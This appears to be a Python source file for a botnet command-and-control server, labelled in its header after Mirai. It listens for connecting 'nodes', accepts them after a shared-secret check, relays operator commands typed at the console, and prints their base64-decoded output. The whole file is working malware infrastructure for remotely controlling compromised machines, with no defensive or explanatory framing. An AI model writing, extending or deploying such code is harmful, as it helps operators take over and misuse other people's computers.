# cnc.py — command & control server (mirai naming).
# listener, task queue, per-node state.

import socket
import threading
import base64


def _handle(conn, addr, secret):
    try:
        sent = conn.recv(256).decode(errors="ignore").strip()
        if sent != secret:
            conn.close()
            return
        print(f"[+] node {addr}")
        while True:
            cmd = input(f"{addr}> ").strip()
            if not cmd:
                continue
            conn.sendall(cmd.encode() + b"\n")
            if cmd == "exit":
                break
            data = conn.recv(65535)
            try:
                print(base64.b64decode(data).decode(errors="ignore"))
            except Exception:
                print(data)
    except Exception as e:
        print(f"[-] {addr}: {e}")
    finally:
        conn.close()


def serve(host, port, secret):
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(16)
    print(f"[*] cnc listening {host}:{port}")
    while True:
        c, a = srv.accept()
        threading.Thread(target=_handle, args=(c, a, secret), daemon=True).start()
